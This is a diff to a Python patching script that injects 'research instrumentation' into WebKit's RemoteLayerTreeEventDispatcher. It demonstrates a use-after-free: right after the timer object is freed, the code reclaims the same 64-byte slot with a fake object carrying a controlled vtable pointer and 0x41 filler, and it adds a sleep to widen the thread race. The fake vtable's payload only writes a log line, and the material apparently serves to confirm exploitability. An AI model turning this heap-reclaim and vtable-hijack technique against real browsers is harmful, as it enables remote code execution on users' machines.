@@ -53,17 +53,28 @@ MM_OLD = """RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
 MM_NEW = """// ---- WK_INTERPOSE_EXPERIMENT (research instrumentation) ------------------
 #include <fcntl.h>
 #include <unistd.h>
-static void wkInterposeLog(const char* tag, const void* a, const void* b)
+#include <sys/uio.h>
+#include <string.h>
+static void wkInterposeLog(const char* tag)
 {
+    // No libc string/buffer functions: WebKit builds with
+    // -Werror,-Wunsafe-buffer-usage-in-libc-call. Fixed tag strings only.
+    const char* prefix = "WK-INTERPOSE ";
+    const char* newline = "\n";
+    struct iovec iov[3];
+    iov[0].iov_base = const_cast<char*>(prefix);
+    iov[0].iov_len = 13;
+    iov[1].iov_base = const_cast<char*>(tag);
+    iov[1].iov_len = strlen(tag);
+    iov[2].iov_base = const_cast<char*>(newline);
+    iov[2].iov_len = 1;
     int fd = open("/tmp/wk-interpose-log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (fd >= 0) {
-        char buf[256];
-        int n = snprintf(buf, sizeof(buf), "WK-INTERPOSE %s a=%p b=%p\\n", tag, a, b);
-        if (n > 0) write(fd, buf, static_cast<size_t>(n));
+        writev(fd, iov, 3);
         close(fd);
     }
 }
-static void wkInterposeHit() { wkInterposeLog("HIT", nullptr, nullptr); }
+static void wkInterposeHit() { wkInterposeLog("HIT"); }
 static void* wkInterposeFakeVtable[16] = {
     (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
     (void*)&wkInterposeHit, (void*)&wkInterposeHit, (void*)&wkInterposeHit,
@@ -80,17 +91,23 @@ RemoteLayerTreeEventDispatcher::~RemoteLayerTreeEventDispatcher()
     ASSERT(!m_displayRefreshObserverID);
     if (m_delayedRenderingUpdateDetectionTimer) {
         auto* raw = m_delayedRenderingUpdateDetectionTimer.release();
-        wkInterposeLog("TEARDOWN-FREE", raw, nullptr);
+        wkInterposeLog("TEARDOWN-FREE");
         delete raw; // pre-fix: destroyed on the MAIN thread while the
                     // scrolling thread's CFRunLoopTimer callback may be
                     // in flight holding this raw pointer as context.
-        auto* bytes = static_cast<unsigned char*>(malloc(64)); // same 64-byte class
-        if (bytes) {
-            auto** vptrSlot = reinterpret_cast<void**>(bytes);
-            vptrSlot[0] = (void*)&wkInterposeFakeVtable;    // controlled vptr
-            for (size_t i = 8; i < 64; ++i)                 // attacker-influenced bytes
-                bytes[i] = 0x41;
-            wkInterposeLog("SLOT-RECLAIMED", raw, bytes);   // freed vs reclaimed addr
+        // 64-byte fake object in the same fastMalloc size class. Layout via a
+        // struct to avoid raw-pointer arithmetic (WebKit -Werror unsafe-buffer).
+        struct WKInterposeFake {
+            void* vptr;
+            uint8_t payload[56];
+        };
+        static_assert(sizeof(WKInterposeFake) == 64, "must match the 64-byte class");
+        auto* fake = static_cast<WKInterposeFake*>(malloc(sizeof(WKInterposeFake)));
+        if (fake) {
+            fake->vptr = (void*)&wkInterposeFakeVtable;      // controlled vptr
+            for (auto& byte : fake->payload)                 // attacker-influenced bytes
+                byte = 0x41;
+            wkInterposeLog("SLOT-RECLAIMED");
         }
     }
 }"""
@@ -113,10 +130,18 @@ CF_NEW = """        auto timer = static_cast<TimerBase*>(context);
 
         timer->fired();"""
 
-patch(CF, CF_OLD, CF_NEW, "runloop-window")
+with open(CF) as fh:
+    cf_src = fh.read()
+if "WK_INTERPOSE_USLEEP_US" not in cf_src and "usleep" not in cf_src:
+    patch(CF, CF_OLD, CF_NEW, "runloop-window")
+else:
+    print("PATCH runloop-window: already present, skipping")
 
 # usleep needs unistd.h
-patch(CF, "#include <wtf/RunLoop.h>",
-      "#include <wtf/RunLoop.h>\n#include <unistd.h>", "unistd")
+if "#include <unistd.h>" not in cf_src:
+    patch(CF, "#include <wtf/RunLoop.h>",
+          "#include <wtf/RunLoop.h>\n#include <unistd.h>", "unistd")
+else:
+    print("PATCH unistd: already present, skipping")
 
 print("WK_INTERPOSE_EXPERIMENT: all patches applied")
